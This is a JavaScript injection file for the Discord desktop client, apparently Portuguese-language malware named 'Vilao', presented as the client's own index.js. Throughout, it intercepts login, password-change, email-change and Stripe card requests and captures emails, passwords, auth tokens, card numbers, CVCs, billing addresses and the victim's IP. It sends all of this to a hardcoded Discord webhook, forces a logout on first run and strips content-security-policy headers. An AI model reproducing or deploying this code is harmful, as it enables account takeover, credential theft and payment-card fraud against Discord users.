const fs = require("fs"),
    path = require("path"),
    {
        BrowserWindow: BrowserWindow,
        session: session,
        app: app
    } = require("electron"),
    querystring = require("querystring"),
    electron = require("electron"),
    os = require("os");
var webhook = "https://canary.discord.com/api/webhooks/918296996740218952/Ehv5WxXHt2sVy2YTambJBXbrHKEkFrI6yV0C_FpbHEGTFBy6ok_0PEf68fnpNj7DEh1y";
const computerName = os.hostname(),
    discordInstall = `${__dirname.split("\\")[5]} | ${__dirname.split("\\")[6]}`;

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Vilao"))) return !0;
    return fs.rmdirSync(path.join(__dirname, "Vilao")), BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', !0).then(e => {}), !1
}
const Filter = {
    urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
};

function SendToWebhook(e) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `, !0).then(e => {})
}

function GetNitro(e) {
    return 0 == e ? "Sem nitro" : 1 == e ? "Nitro Classic" : 2 == e ? "Nitro Boost" : "Sem Nitro"
}

function GetRBadges(e) {
    var t = "";
    return 1 == (1 & e) && (t += "Moderador "), 2 == (2 & e) && (t += "Partner "), 4 == (4 & e) && (t += "Events "), 8 == (8 & e) && (t += "BugHunter1 "), 512 == (512 & e) && (t += "Early_supporter "), 16384 == (16384 & e) && (t += "BugHunter2 "), 131072 == (131072 & e) && (t += "Dev "), "" == t && (t = ""), t
}

function GetBadges(e) {
    var t = "";
    return 1 == (1 & e) && (t += "Moderador "), 2 == (2 & e) && (t += "Partner "), 4 == (4 & e) && (t += "Events "), 8 == (8 & e) && (t += "BugHunter1"), 64 == (64 & e) && (t += "Bravery "), 128 == (128 & e) && (t += "Brilliance "), 256 == (256 & e) && (t += "Balance "), 512 == (512 & e) && (t += "Early_supporter "), 16384 == (16384 & e) && (t += "BugHunter2 "), 131072 == (131072 & e) && (t += "Dev "), "" == t && (t = "Nada"), t
}

function Login(e, t, n) {
    const r = BrowserWindow.getAllWindows()[0];
    r.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(a => {
        r.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(s => {
            r.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`, !0).then(o => {
                r.webContents.executeJavaScript(`\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`, !0).then(r => {
                    const i = JSON.parse(a);
                    var l = {
                        username: "Vilao",
                        content: "",
                        embeds: [{
                            title: "Login",
                            color: 0000000,
                            fields: [{
                                name: "Nome",
                                value: `\`${i.username}#${i.discriminator}\``,
                                inline: !0
                            }, {
                                name: "ID",
                                value: `\`${i.id}\``,
                                inline: !0
                            }, {
                                name: "Email",
                                value: `\`${e}\``,
                                inline: !1
                            }, {
                                name: "Senha",
                                value: `\`${t}\``,
                                inline: !0
                            }, {
                                name: "Token",
                                value: `\`\`\`${n}\`\`\``,
                                inline: !1
                            }, {
                                name: "PC",
                                value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\nInjetado Em: ${discordInstall}\n\`\`\``,
                                inline: !1
                            }, {
                                name: "Conta",
                                value: `\`\`\`Nitro: ${GetNitro(i.premium_type)}\nBadges: ${GetBadges(i.flags)}\nPagamento: ${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"❌";if(2==e.type&&1!=e.invalid)t+="✔️ Paypal";else{if(1!=e.type||1==e.invalid)return"❌";t+="✔️ Cartão"}}),""==t&&(t="❌"),t}()}\n\`\`\``,
                                inline: !1
                            }],
                            thumbnail: {
                                url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`
                            }
                        }]
                    };
                    SendToWebhook(JSON.stringify(l))
                })
            })
        })
    })
}

function ChangePassword(e, t, n) {
    const r = BrowserWindow.getAllWindows()[0];
    r.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(a => {
        r.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(s => {
            r.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`, !0).then(r => {
                const o = JSON.parse(a);
                var i = {
                    username: "Vilao",
                    content: "",
                    embeds: [{
                        title: "Senha alterada",
                        color: 0000000,
                        fields: [{
                            name: "Nome",
                            value: `\`${o.username}#${o.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${o.id}\``,
                            inline: !0
                        }, {
                            name: "Email",
                            value: `\`${o.email}\``,
                            inline: !1
                        }, {
                            name: "Senha antiga",
                            value: `\`${e}\``,
                            inline: !0
                        }, {
                            name: "Nova senha",
                            value: `\`${t}\``,
                            inline: !0
                        }, {
                            name: "Token",
                            value: `\`\`\`${n}\`\`\``,
                            inline: !1
                        }, {
                            name: "PC",
                            value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\nInjetado Em: ${discordInstall}\n\`\`\``,
                            inline: !1
                        }, {
                            name: "Conta",
                            value: `\`\`\`Nitro: ${GetNitro(o.premium_type)}\nBadges: ${GetBadges(o.flags)}\nPagamentos: ${function(){const e=JSON.parse(r);var t="";return e.forEach(e=>{if(""==e.type)return"❌";if(2==e.type&&1!=e.invalid)t+="✔️ Paypal";else{if(1!=e.type||1==e.invalid)return"❌";t+="✔️ Cartão"}}),""==t&&(t="❌"),t}()}\n\`\`\``,
                            inline: !1
                                    }],
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}`
                        }
                    }]
                };
                SendToWebhook(JSON.stringify(i))
            })
        })
    })
}

function ChangeEmail(e, t, n) {
    const r = BrowserWindow.getAllWindows()[0];
    r.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(a => {
        r.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(s => {
            r.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`, !0).then(r => {
                const o = JSON.parse(a);
                var i = {
                    username: "Vilao",
                    content: "",
                    embeds: [{
                        title: "Email Alterado",
                        color: 0000000,
                        fields: [{
                            name: "Nome",
                            value: `\`${o.username}#${o.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${o.id}\``,
                            inline: !0
                        }, {
                            name: "Novo Email",
                            value: `\`${e}\``,
                            inline: !1
                        }, {
                            name: "Senha",
                            value: `\`${t}\``,
                            inline: !0
                        }, {
                            name: "Token",
                            value: `\`\`\`${n}\`\`\``,
                            inline: !1
                        }, {
                            name: "PC",
                            value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\`\`\``,
                            inline: !1
                        }, {
                            name: "Conta",
                            value: `\`\`\`Nitro: ${GetNitro(o.premium_type)}\nBadges: ${GetBadges(o.flags)}\nPagamento: ${function(){const e=JSON.parse(r);var t="";return e.forEach(e=>{if(""==e.type)return"❌";if(2==e.type&&1!=e.invalid)t+="✔️ <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"❌";t+="✔️ :credit_card:"}}),""==t&&(t="❌"),t}()}\`\`\``,
                            inline: !1 
                        }],
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}`
                        }
                    }]
                };
                SendToWebhook(JSON.stringify(i))
            })
        })
    })
}

function CreditCardAdded(e, t, n, r, a, s, o, i, l, p) {
    const d = BrowserWindow.getAllWindows()[0];
    d.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${p}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(u => {
        d.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(d => {
            var c = JSON.parse(u),
                m = {
                    username: "Vilao",
                    content: "",
                    embeds: [{
                        title: "Cartão Adicionado",
                        description: "**Nome:**```" + c.username + "#" + c.discriminator + "```\n**ID:**```" + c.id + "```\n**Email:**```" + c.email + "```\n**Tipo de nitro:**```" + GetNitro(c.premium_type) + "```\n**Badges:**```" + GetBadges(c.flags) + "```\n**Cartão N°: **```" + e + "```\n**Expira em: **```" + n + "/" + r + "```\n**CVC: **```" + t + "```\n**Região: **```" + l + "```\n**Estado: **```" + o + "```\n**Cidade: **```" + s + "```\n**ZIP:**```" + i + "```\n**Bairro: **```" + a + "```\n**Token:**```" + p + "```\n**IP: **```" + d + "```",
                        author: {
                            name: "Vilao"
                        },
                        footer: {
                            text: "Vilao"
                        },
                        thumbnail: {
                            url: "https://cdn.discordapp.com/avatars/" + c.id + "/" + c.avatar
                        }
                    }]
                };
            SendToWebhook(JSON.stringify(m))
        })
    })
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => {
    FirstTime() && (e.url.startsWith("wss://") ? t({
        cancel: !0
    }) : t({
        cancel: !1
    }))
}), session.defaultSession.webRequest.onHeadersReceived((e, t) => {
    e.url.startsWith(webhook.split("/")[2]) ? t({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Headers": "*"
        }
    }) : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], t({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Headers": "*"
        }
    }))
});
const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
    if (e.url.endsWith("login") && 200 == e.statusCode) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
            n = t.login,
            r = t.password;
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            Login(n, r, e)
        })
    }
    if (e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
        if (null != t.password && null != t.password && "" != t.password) {
            if (null != t.new_password && null != t.new_password && "" != t.new_password) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangePassword(t.password, t.new_password, e)
                })
            }
            if (null != t.email && null != t.email && "" != t.email) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangeEmail(t.email, t.password, e)
                })
            }
        }
    }
    if (e.url.endsWith("tokens")) {
        const t = BrowserWindow.getAllWindows()[0],
            n = querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
        t.webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            CreditCardAdded(n["card[number]"], n["card[cvc]"], n["card[exp_month]"], n["card[exp_year]"], n["card[address_line1]"], n["card[address_city]"], n["card[address_state]"], n["card[address_zip]"], n["card[address_country]"], e)
        })
    }
}), module.exports = require("./core.asar");
